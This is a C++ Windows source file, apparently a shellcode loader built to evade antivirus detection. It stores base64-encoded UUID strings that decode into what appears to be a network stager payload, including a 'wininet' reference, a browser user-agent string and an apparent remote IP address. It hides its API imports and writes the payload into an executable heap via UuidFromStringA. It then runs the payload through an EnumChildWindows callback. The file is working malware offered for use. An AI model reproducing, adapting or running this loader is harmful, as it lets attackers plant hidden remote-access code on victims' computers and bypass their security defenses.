#include <Windows.h>
#include <Rpc.h>
#include <iostream>
#pragma comment(lib, "Rpcrt4.lib")
#include "base64.h"


const string uuids_base64[] =
{
	"ZTQ4MzQ4ZmMtZThmMC0wMGM4LTAwMDAtNDE1MTQxNTA1MjUx", "ZDIzMTQ4NTYtNDg2NS01MjhiLTYwNDgtOGI1MjE4NDg4YjUy", "NzI4YjQ4MjAtNDg1MC1iNzBmLTRhNGEtNGQzMWM5NDgzMWMw", "N2M2MTNjYWMtMmMwMi00MTIwLWMxYzktMGQ0MTAxYzFlMmVk", "NDg1MTQxNTItNTI4Yi04YjIwLTQyM2MtNDgwMWQwNjY4MTc4", "NzUwMjBiMTgtOGI3Mi04ODgwLTAwMDAtMDA0ODg1YzA3NDY3", "NTBkMDAxNDgtNDg4Yi00NDE4LThiNDAtMjA0OTAxZDBlMzU2", "NDFjOWZmNDgtMzQ4Yi00ODg4LTAxZDYtNGQzMWM5NDgzMWMw", "YzljMTQxYWMtNDEwZC1jMTAxLTM4ZTAtNzVmMTRjMDM0YzI0", "ZDEzOTQ1MDgtZDg3NS00NDU4LThiNDAtMjQ0OTAxZDA2NjQx", "NDQ0ODBjOGItNDA4Yi00OTFjLTAxZDAtNDE4YjA0ODg0ODAx", "NDE1ODQxZDAtNWU1OC01YTU5LTQxNTgtNDE1OTQxNWE0ODgz", "NTI0MTIwZWMtZTBmZi00MTU4LTU5NWEtNDg4YjEyZTk0ZmZm", "NmE1ZGZmZmYtNDkwMC03N2JlLTY5NmUtNjk2ZTY1NzQwMDQx", "ZTY4OTQ5NTYtODk0Yy00MWYxLWJhNGMtNzcyNjA3ZmZkNTQ4", "MzE0OGM5MzEtNGRkMi1jMDMxLTRkMzEtYzk0MTUwNDE1MDQx", "Nzk1NjNhYmEtZmZhNy1lOWQ1LTkzMDAtMDAwMDVhNDg4OWMx", "MDFiYmI4NDEtMDAwMC0zMTRkLWM5NDEtNTE0MTUxNmEwMzQx", "NTdiYTQxNTEtOWY4OS1mZmM2LWQ1ZWItNzk1YjQ4ODljMTQ4", "ODk0OWQyMzEtNGRkOC1jOTMxLTUyNjgtMDAzMmMwODQ1MjUy", "NTVlYmJhNDEtM2IyZS1kNWZmLTQ4ODktYzY0ODgzYzM1MDZh", "ODk0ODVmMGEtYmFmMS0wMDFmLTAwMDAtNmEwMDY4ODAzMzAw", "ZTA4OTQ5MDAtYjk0MS0wMDA0LTAwMDAtNDFiYTc1NDY5ZTg2", "ODk0OGQ1ZmYtNDhmMS1kYTg5LTQ5YzctYzBmZmZmZmZmZjRk", "NTI1MmM5MzEtYmE0MS0wNjJkLTE4N2ItZmZkNTg1YzAwZjg1", "MDAwMDAxOWQtZmY0OC0wZmNmLTg0OGMtMDEwMDAwZWJiM2U5", "MDAwMDAxZTQtODJlOC1mZmZmLWZmMmYtNGM3MDU4NDkwMGRm", "YzcwYjU1ZTYtMTkwYi1iNDRkLTc0OGYtMDY4OThhNjIxNzhm", "MjFjODhhYzItMWJhMC0zZjJlLWY5Y2YtNGIzMjcyZTJlOTc0", "ZjUzMjZjMmQtMGVkMi1iMWNhLThhMGEtYzZmMmY4ZWNlMDVj", "NjI4NjVlODAtOGQyNC0xMDBhLTUxZDYtZGFhZjg0Y2U4YThh", "MTg3OGZhYTctYmM5Ny01MGIwLTAwNTUtNzM2NTcyMmQ0MTY3", "M2E3NDZlNjUtNGQyMC03YTZmLTY5NmMtNmM2MTJmMzUyZTMw", "NmY2MzI4MjAtNzA2ZC03NDYxLTY5NjItNmM2NTNiMjA0ZDUz", "MzEyMDQ1NDktMmUzMC0zYjMwLTIwNTctNjk2ZTY0NmY3Nzcz", "MjA1NDRlMjAtMmUzNi0zYjMyLTIwNTctNGY1NzM2MzQzYjIw", "NjQ2OTcyNTQtNmU2NS0yZjc0LTM2MmUtMzAzYjIwNGQ0MTQ3", "Mjk1MzRhNTctMGEwZC1jZTAwLTc1OGQtZmI3ZGRiZDYwNTFi", "ZmE0NWM1Y2ItMjE3ZS1lNTVmLWMzMGItODhmMzIyZjQyYmY3", "NmU1Y2ZhNTUtZGViZC05OTMxLWJiZWYtMWExZWVlYjkzYWIx", "NDZiMWJjNTYtODA1Ni1mMWIzLTdiODgtOTNhMjc2N2E1OTk1", "MmQwNjY3NGEtMzZjYi01MWIyLTg1ODMtYjhmYzU5NTdlODVi", "MWZhMjU3MjEtNWZjMC0xMDAzLWUxODUtMDRiMDYwZTZlN2E3", "NDAzMjUyOTgtNDc0NC02MWRiLWI3MTEtNDI1YWYyMjAwNmI3", "ZWQyNjlhYzYtOWE1ZS04N2ZkLTllNzMtNjZhOWU5ZjU5NWM3", "MmQ0ZDYzNzQtMTNhYi1mNTAwLWU2ODAtMDBmNDY5Yzg1NWRl", "MmM3NzlkZTYtMWNiNy0yMmFmLWU5YTctZmMxYzM3ZTdlOWQ2", "MzBmZThlZDEtMjFhZS1kZDlmLWU5ZGMtNjJiY2ZkZjI2ODkz", "ZTE0YzYxZWUtMGUzOS1jNjBjLTM3YTMtZTNhNDI3YjE3MmVj", "OWNmYmYzYjAtNzk3OS02MGY1LTc3NzMtY2RjNTczNjEwMTA5", "NzA3NWMzYjUtYjFhOS1hMjRlLTAwNDEtYmVmMGI1YTI1NmZm", "YzkzMTQ4ZDUtMDBiYS00MDAwLTAwNDEtYjgwMDEwMDAwMDQx", "MDAwMDQwYjktNDEwMC01OGJhLWE0NTMtZTVmZmQ1NDg5MzUz", "ZTc4OTQ4NTMtODk0OC00OGYxLTg5ZGEtNDFiODAwMjAwMDAw", "NDFmOTg5NDktMTJiYS04OTk2LWUyZmYtZDU0ODgzYzQyMDg1", "NjZiNjc0YzAtMDc4Yi0wMTQ4LWMzODUtYzA3NWQ3NTg1ODU4", "MDAwMDA1NDgtMDAwMC1jMzUwLWU4N2YtZmRmZmZmMzEyZTMx", "MzAzODJlMzUtMzEyZS0zMjMwLTAwNDktOTYwMmQyMDAwMDAw"
};


static const char encode_map[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static char decode_map[256];
static void initBase64DecodeMap()
{
	memset(decode_map, -1, sizeof(decode_map));
	for (int i = 'A'; i <= 'Z'; ++i) decode_map[i] = 0 + (i - 'A');
	for (int i = 'a'; i <= 'z'; ++i) decode_map[i] = 26 + (i - 'a');
	for (int i = '0'; i <= '9'; ++i) decode_map[i] = 52 + (i - '0');
	decode_map[(unsigned char)'+'] = 62;
	decode_map[(unsigned char)'/'] = 63;
	decode_map[(unsigned char)'='] = 0;
}


bool CBase64::Encode(const string& strIn, string& strOut)
{
	size_t nInLen = strIn.length();
	size_t numOrig24BitValues = nInLen / 3;
	bool havePadding = (nInLen != numOrig24BitValues * 3);
	bool havePadding2 = (nInLen == numOrig24BitValues * 3 + 1);
	size_t numResultBytes = 4 * (numOrig24BitValues + havePadding);
	strOut.clear();
	for (size_t i = 0; i < numOrig24BitValues; ++i)
	{
		strOut.append(1, encode_map[(strIn[3 * i] >> 2) & 0x3F]);
		strOut.append(1, encode_map[((strIn[3 * i] << 4) & 0x30) | ((strIn[3 * i + 1] >> 4) & 0x0F)]);
		strOut.append(1, encode_map[((strIn[3 * i + 1] << 2) & 0x3C) | ((strIn[3 * i + 2] >> 6) & 0x03)]);
		strOut.append(1, encode_map[strIn[3 * i + 2] & 0x3F]);

	}

	if (havePadding)
	{
		size_t i = numOrig24BitValues;
		strOut.append(1, encode_map[(strIn[3 * i] >> 2) & 0x3F]);
		if (havePadding2)
		{
			strOut.append(1, encode_map[((strIn[3 * i] << 4) & 0x30) | ((strIn[3 * i + 1] >> 4) & 0x0F)]);
			strOut.append(1, '=');
		}
		else
		{
			strOut.append(1, encode_map[((strIn[3 * i] << 4) & 0x30) | ((strIn[3 * i + 1] >> 4) & 0x0F)]);
			strOut.append(1, encode_map[((strIn[3 * i + 1] << 2) & 0x3C) | ((strIn[3 * i + 2] >> 6) & 0x03)]);
		}
		strOut.append(1, '=');
	}

	return true;
}


bool CBase64::Decode(const string& strIn, string& strOut, bool fCheckInputValid/* = false*/)
{
	size_t nInlen = strIn.length();
	if (nInlen < 4 || (nInlen % 4) != 0)
	{
		return false;
	}

	static bool bInit = false;
	if (!bInit)
	{
		initBase64DecodeMap();
		bInit = true;
	}

	if (fCheckInputValid)
	{
		for (size_t i = 0; i < nInlen; ++i)
		{
			if (decode_map[(unsigned char)strIn[i]] == -1)
			{
				return false;
			}
		}
	}
	size_t nOutLen = (nInlen * 3) / 4;
	string strTmpOut;
	strTmpOut.resize(nOutLen);
	size_t nLoopLen = nOutLen / 3;
	for (size_t i = 0; i < nLoopLen; ++i)
	{
		strTmpOut[i * 3] = ((decode_map[strIn[i * 4]] << 2) & 0xFC) | ((decode_map[strIn[i * 4 + 1]] >> 4) & 0x03);
		strTmpOut[i * 3 + 1] = ((decode_map[strIn[i * 4 + 1]] << 4) & 0xF0) | ((decode_map[strIn[i * 4 + 2]] >> 2) & 0x0F);
		strTmpOut[i * 3 + 2] = ((decode_map[strIn[i * 4 + 2]] << 6) & 0xC0) | (decode_map[strIn[i * 4 + 3]] & 0x3F);
	}

	if (strIn[nInlen - 1] == '=')
	{
		nOutLen--;
		if (strIn[nInlen - 2] == '=')
		{
			nOutLen--;
		}
	}
	const char* pData = strTmpOut.data();
	strOut.clear();
	strOut.append(pData, pData + nOutLen);
	return true;
}

//1 
typedef HANDLE(WINAPI* ImportHeapCreate)(
	_In_ DWORD flOptions,
	_In_ SIZE_T dwInitialSize,
	_In_ SIZE_T dwMaximumSize
	);

typedef LPVOID(WINAPI* ImportHeapAlloc)(
	_In_ HANDLE hHeap,
	_In_ DWORD dwFlags,
	_In_ SIZE_T dwBytes
	);

typedef RPC_STATUS(RPC_ENTRY* ImportUuidFromStringA)(
	_In_opt_ RPC_CSTR StringUuid,
	_Out_ UUID __RPC_FAR* Uuid
	);


int main()
{

	ImportHeapCreate MyHeapCreate = (ImportHeapCreate)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "HeapCreate");
	ImportHeapAlloc MyHeapAlloc = (ImportHeapAlloc)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "HeapAlloc");


	HMODULE hModule = LoadLibraryA("RPCRT4.dll");
	ImportUuidFromStringA MyUuidFromStringA = (ImportUuidFromStringA)GetProcAddress(hModule, "UuidFromStringA");


	HANDLE hc = MyHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);//在进程的虚拟地址空间中保留空间
	void* ha = MyHeapAlloc(hc, 0, 0x100000);//申请内存
	DWORD_PTR hptr = (DWORD_PTR)ha;

	string tmp = "";
	int num = sizeof(uuids_base64) / sizeof(uuids_base64[0]);
	// char* uuids[num];
	for (int i = 0; i < num; i++) {
		CBase64::Decode(uuids_base64[i], tmp);
		std::cout << tmp;
		RPC_STATUS status = MyUuidFromStringA((RPC_CSTR)tmp.c_str(), (UUID*)hptr);//UUID转换为原来的shellcode写入内存

		if (status != RPC_S_OK) {
			CloseHandle(ha);
			return -1;
		}
		hptr += 16;
	}


	EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
	CloseHandle(ha);


	return 0;
}
